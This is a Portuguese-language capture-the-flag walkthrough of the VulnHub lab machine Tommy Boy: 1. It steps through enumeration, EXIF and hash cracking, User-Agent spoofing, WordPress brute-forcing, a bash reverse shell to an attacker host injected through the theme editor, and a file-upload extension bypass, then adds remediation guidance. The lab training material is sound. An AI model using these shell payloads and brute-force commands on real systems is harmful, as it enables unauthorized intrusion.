# Tommy Boy: 1 — A Callahan Auto do Big Tom Vai Tomar Um Hack

SANTO SHNIKEYS!! Tommy Boy: 1 é um CTF narrativo baseado na comédia clássica de 1995 com Chris Farley, onde você joga como o atacante ajudando Tommy a restaurar o site da Callahan Auto após uma invasão. Cinco flags, múltiplos serviços, esteganografia, geração de wordlist customizada, spoofing de User-Agent, exploração WordPress e bypass de upload de arquivo. Essa máquina é sensacional, uma aventura genuinamente divertida do início ao fim. Criada por Brian Johnson da 7 Minute Security, é uma das máquinas CTF mais criativas do VulnHub. Sem mentira, essa aqui testa a amplitude metodológica mais do que qualquer outra box para iniciantes.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Tommy Boy: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tommy-boy-1,157/ |
| **Técnicas** | Varredura completa Nmap, Nikto web scan, análise robots.txt, enumeração WordPress (wpscan), extração de metadados EXIF, cracking MD5, FTP em porta não-padrão, spoofing User-Agent, dirb com User-Agent customizado, geração de wordlist com crunch, brute-force de zip com fcrackzip, injeção de código no tema WordPress, acesso SSH, restauração de website, bypass de upload (renomeação de extensão) |
| **CVEs** | CWE-434 (Upload Irrestrito de Arquivo via bypass de extensão), CWE-287 (Bypass de autenticação WordPress admin via brute-force), CWE-284 (Controle de Acesso Impróprio via restrição User-Agent) |
| **Grupos APT** | APT41: explora instalações WordPress via brute-force de credenciais e injeção de código no admin; FIN7: usa esteganografia e extração de dados em múltiplos estágios para descoberta de flags e credenciais em operações direcionadas |

---

## Resumo do Ataque

```
nmap varredura completa → portas 80, 8080, 65534 (FTP), 22 (SSH)
  → HTTP 80: página estática → robots.txt → /flag.txt (Flag 1)
  → HTTP 8080: WordPress
  → wpscan: usuários/posts → fonte da página → metadados EXIF
  → EXIF: hint embutido → hash MD5 → crackeado → senha WordPress
  → WordPress: post protegido por senha → Flag 2
  → FTP 65534: login com creds WordPress → download de arquivos
  → Arquivo FTP: dica sobre spoofing User-Agent
  → HTTP 80: User-Agent: iPhone → página diferente
  → dirb com User-Agent customizado → arquivo HTML oculto
  → Arquivo HTML: dica crunch → fcrackzip → Flag 3 (zip)
  → wpscan: brute-force admin → acesso WordPress admin
  → Editor de tema WordPress: injeção PHP reverse shell
  → shell netcat → www-data
  → SSH como tommy (dos arquivos FTP) → restauração do website
  → bypass upload → webshell → flag/reverse shell → Flag 4 / Flag 5
```

---

## Metodologia

1. Varredura completa incluindo portas altas (FTP na 65534)
2. Enumeração robots.txt para caminhos expostos
3. Enumeração WordPress com wpscan: usuários, posts, metadados
4. Extração de metadados EXIF de imagens WordPress
5. Cracking de hash MD5 para conteúdo protegido por senha
6. Acesso FTP em porta não-padrão com credenciais WordPress
7. Spoofing User-Agent para conteúdo restrito a iPhone
8. Enumeração dirb customizada com User-Agent falsificado
9. Geração de wordlist customizada com crunch para cracking de zip
10. Brute-force WordPress admin com wpscan
11. Reverse shell via editor de tema WordPress
12. Acesso SSH e restauração do website
13. Bypass de upload para recuperação de flags adicionais

---

## Passo 1 — Descoberta de Host e Varredura Completa de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.108

# CRÍTICO: Usar varredura completa de portas — FTP está na porta 65534
nmap -sV -sC -p- 192.168.1.108
# Também execute:
nikto -h http://192.168.1.108
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.x
80/tcp    open  http    Apache httpd
8080/tcp  open  http    Apache httpd (WordPress)
65534/tcp open  ftp     vsftpd
```

Lição principal: sempre use `-p-` em máquinas CTF. Portas de serviço não-padrão são um truque CTF comum para filtrar scanners preguiçosos.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — HTTP Porta 80: robots.txt e Flag 1

```bash
curl http://192.168.1.108/robots.txt
# Revela: /flag.txt

curl http://192.168.1.108/flag.txt
```

Flag 1 está no web root: `B34rcl4ws`

Veja o código-fonte da página para dicas:

```bash
curl -s http://192.168.1.108/ | grep -i "flag\|hint\|<!-- "
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração WordPress na Porta 8080

```bash
wpscan --url http://192.168.1.108:8080/ --enumerate u,p
```

Enumere usuários e posts. Encontre um post de blog protegido por senha. Encontre uma imagem em um dos posts.

Faça download da imagem do post WordPress:

```bash
wget http://192.168.1.108:8080/wp-content/uploads/<imagem>.jpg
exiftool <imagem>.jpg
# Procure por: Comment, UserComment, Artist, Copyright com dados embutidos
```

O campo de comentário EXIF contém um hash MD5 ou uma dica levando a uma senha.

**MITRE ATT&CK:** T1595.002 — Varredura Ativa; T1592 — Coletar Informações de Host da Vítima

---

## Passo 4 — Cracking MD5 para Senha WordPress

Os metadados EXIF contêm algo como: `NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=`

```bash
echo "NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=" | base64 -d
# Saída: hash MD5 como 543d0ec58069143...

# Crack com hashcat:
echo "543d0ec580691438..." > /tmp/hash.txt
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt

# Ou online: crackstation.net
```

Use a senha crackeada para desbloquear o post WordPress protegido por senha: **Flag 2**

**MITRE ATT&CK:** T1552 — Credenciais Não Seguras; T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 5 — FTP na Porta 65534

```bash
ftp 192.168.1.108 65534
# Usuário: tommy (ou o usuário WordPress)
# Senha: (use senha WordPress ou creds FTP-específicos dos passos anteriores)

ftp> ls -la
ftp> mget *
ftp> quit
```

O FTP contém arquivos com dicas: uma nota sobre User-Agent customizado, um arquivo zip ou uma dica sobre mais conteúdo.

```bash
cat <arquivo_baixado>
# Nota sobre usar User-Agent iPhone para acessar uma página específica
```

**MITRE ATT&CK:** T1021.003 — Serviços Remotos: FTP

---

## Passo 6 — Spoofing de User-Agent

A porta 80 serve conteúdo diferente baseado no User-Agent. Falsifique um User-Agent de iPhone:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
  http://192.168.1.108/
```

Conteúdo diferente aparece para usuários mobile. Encontre uma referência a uma página ou arquivo oculto.

**MITRE ATT&CK:** T1036 — Mascaramento; T1190 — Explorar Aplicação Voltada ao Público

---

## Passo 7 — dirb com User-Agent Customizado para Conteúdo Oculto

```bash
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt \
  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)"
```

Descubra um arquivo HTML oculto acessível apenas com o User-Agent de iPhone. Leia-o:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
  http://192.168.1.108/<arquivo_oculto>.html
```

O HTML contém uma dica para gerar uma wordlist customizada com `crunch`.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 8 — Wordlist Customizada e Cracking de Zip para Flag 3

Baseado na dica no arquivo HTML, gere uma wordlist direcionada com crunch:

```bash
# Exemplo de padrão baseado no contexto Tommy Boy (Big Tom, callahan, etc.):
crunch <min> <max> <charset> -t <padrao> -o /tmp/tommy_wordlist.txt

# Crack o zip do FTP:
fcrackzip -v -u -D -p /tmp/tommy_wordlist.txt <arquivo>.zip
```

Descompacte com a senha crackeada: **Flag 3**

**MITRE ATT&CK:** T1110.002 — Cracking de Senha

---

## Passo 9 — Brute-Force WordPress Admin

Use wpscan para brute-force do admin WordPress:

```bash
wpscan --url http://192.168.1.108:8080/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack wp-login
```

Ou use as credenciais descobertas para fazer login no admin WordPress em `http://192.168.1.108:8080/wp-admin/`.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 10 — Reverse Shell via Editor de Tema WordPress

No Admin WordPress: Aparência > Editor de Tema > Selecione um arquivo PHP do tema (ex.: `404.php`).

Injete um PHP reverse shell:

```bash
# Inicie o listener
nc -lvnp 4444
```

Substitua o conteúdo do arquivo do tema por:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'");
?>
```

Salve o arquivo e acione-o. Shell retorna como `www-data`. Estabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter Enter
```

**MITRE ATT&CK:** T1505.003 — Web Shell; T1059.004 — Shell Unix

---

## Passo 11 — SSH como Tommy e Restauração do Website

Dos arquivos FTP e enumeração pós-exploração, encontre as credenciais SSH de Tommy. Conecte via SSH:

```bash
ssh tommy@192.168.1.108
```

O desafio pede para restaurar o website da empresa. Procure por arquivos de backup:

```bash
find /var/www -name "*.bak" -o -name "*.backup" -o -name "*.tar.gz" 2>/dev/null
find /home/tommy -type f 2>/dev/null
```

Restaure o backup do website para completar o objetivo da missão.

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 12 — Bypass de Upload para Flags Finais

O website restaurado tem um formulário de upload com filtragem de extensão. Contorne-o:

```bash
# Renomeie shell PHP com extensão permitida:
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php5
# Ou: shell.phtml, shell.pHp, shell.PHP

nc -lvnp 5555
# Faça upload de shell.php5 pelo formulário web
# Acione: navegue até o caminho de upload
```

Colete as flags restantes do shell.

**MITRE ATT&CK:** T1505.003 — Web Shell; T1027 — Arquivos Ofuscados

---

## Flags, Hashes e Credenciais Capturadas

| # | Flag | Valor | Encontrado Em |
|---|---|---|---|
| 1 | robots.txt | B34rcl4ws | /flag.txt via robots.txt |
| 2 | Post WordPress | (conteúdo do post protegido) | Post WordPress protegido por senha |
| 3 | Arquivo Zip | (extraído do zip) | Zip FTP + wordlist crunch |
| 4 | Web shell / SSH | (pós-exploração) | Bypass upload ou enumeração SSH |
| 5 | Mensagem final | (combinação de todas as flags) | Arquivo zip desbloqueado com flags combinadas |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Flag exposta via robots.txt | robots.txt é público; muitas organizações proíbem caminhos admin, backup e config: exatamente onde atacantes olham primeiro | Nunca coloque caminhos sensíveis no robots.txt; use controles de acesso adequados |
| 2 | Metadados EXIF em imagens carregadas | Metadados EXIF vazaram coordenadas GPS, identificadores de dispositivo e credenciais em incidentes reais | Remova dados EXIF de todos os arquivos carregados no servidor antes de servi-los |
| 3 | Restrição de conteúdo baseada em User-Agent | Controle de acesso via User-Agent é ilusório; qualquer cliente HTTP pode falsificar qualquer User-Agent | Nunca use User-Agent para controle de acesso; implemente autenticação adequada |
| 4 | Injeção de código no editor de tema WordPress | Acesso admin WordPress equivale a comprometimento do servidor; o editor de tema é um webshell embutido | Desative a edição de arquivos no WordPress (`define('DISALLOW_FILE_EDIT', true)` no wp-config.php) |
| 5 | Bypass de extensão em upload de arquivo | Blacklists de extensão são facilmente contornadas com extensões alternativas (.php5, .phtml, .pHp) | Use whitelist de extensões permitidas; valide tipo MIME e magic bytes no servidor; armazene uploads fora do web root |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Coleta | Extração de Metadados EXIF | T1592 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Evasão de Defesa | Evasão de Defesa | Mascaramento: Spoofing User-Agent | T1036 |
| Acesso Inicial | Movimento Lateral | Contas Válidas: SSH | T1078 |
| Persistência | Persistência | Web Shell: Injeção no Tema | T1505.003 |
| Persistência | Persistência | Web Shell: Upload de Arquivo | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova flags de caminhos divulgados pelo robots.txt** — robots.txt é público; nunca coloque caminhos de arquivos sensíveis lá
2. **Remova dados EXIF dos uploads** — use ImageMagick `mogrify -strip` ou PHP `Imagick::stripImage()` no servidor
3. **Implemente autenticação adequada** — nunca use User-Agent para controle de acesso; exija credenciais ou whitelist de IP
4. **Desative edição de tema/plugin WordPress** — adicione `define('DISALLOW_FILE_EDIT', true);` ao wp-config.php
5. **Implemente validação de upload de arquivo no servidor** — valide tipo MIME + magic bytes + whitelist de extensão; armazene fora do web root
6. **Habilite autenticação de dois fatores WordPress** — previna acesso admin via brute-force
7. **Mova FTP para porta padrão com autenticação adequada** — porta não-padrão não é um controle de segurança; use SFTP com chaves

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os endpoints de upload e recursos de edição de aplicações web |
| Proteger | Controle de Acesso | Desativar edição de arquivos WordPress; implementar 2FA para admin; validação adequada de upload |
| Proteger | Segurança de Dados | Remover EXIF dos uploads; remover caminhos sensíveis do robots.txt |
| Detectar | Anomalias e Eventos | Alertar sobre alterações de código admin WordPress; uploads de arquivos anômalos |
| Responder | Planejamento de Resposta | Remover webshells injetados; rotacionar credenciais admin WordPress |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Autenticação adequada para todos os caminhos; desativar controle de acesso User-Agent |
| CM-7 | Funcionalidade Mínima | Desativar editor de tema WordPress; restringir tipos de upload |
| IA-2(1) | Autenticação Multi-Fator | 2FA para admin WordPress e SSH |
| SI-10 | Validação de Input de Informação | Validar uploads por tipo MIME e magic bytes |
| SC-28 | Proteção de Informação em Repouso | Remover metadados de arquivos carregados |

### CISA KEV

Exploração WordPress via acesso de credenciais admin e injeção de código no tema se alinha com padrões no Alerta CISA AA21-131A sobre ameaças de web shell. A CISA aconselha organizações a desativar a edição de arquivos no servidor em instalações CMS e implementar controles de upload de arquivos.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Consciência Situacional (SITUATION) | Realizar Registro de Logs | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desativar editor WP; remoção EXIF; validação de upload)
- **D3-NTF** — Filtragem de Tráfego de Rede (restrições User-Agent não têm valor de segurança; substituir por auth)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (chroot FTP; configuração adequada de porta de serviço)

---

## Considerações Finais

Tommy Boy: 1 é genuinamente uma das máquinas mais criativas do VulnHub. Brian Johnson da 7 Minute Security construiu algo que parece um cenário real de resposta a incidentes embalado no tema de uma comédia. A abordagem em múltiplas camadas (robots.txt, EXIF, FTP, User-Agent, WordPress, cracking de zip, upload de arquivo) significa que você absolutamente não pode pular etapas ou forçar a passagem. Cada flag requer uma habilidade diferente.

A lição de controle de acesso via User-Agent é especialmente memorável: construir uma restrição que qualquer cliente HTTP pode contornar em uma linha não é um controle de segurança. É uma expectativa social. Segurança real requer autenticação.

Santo Shnikeys mano, isso foi muito divertido. Thanks guys!! (❍ᴥ❍ʋ)
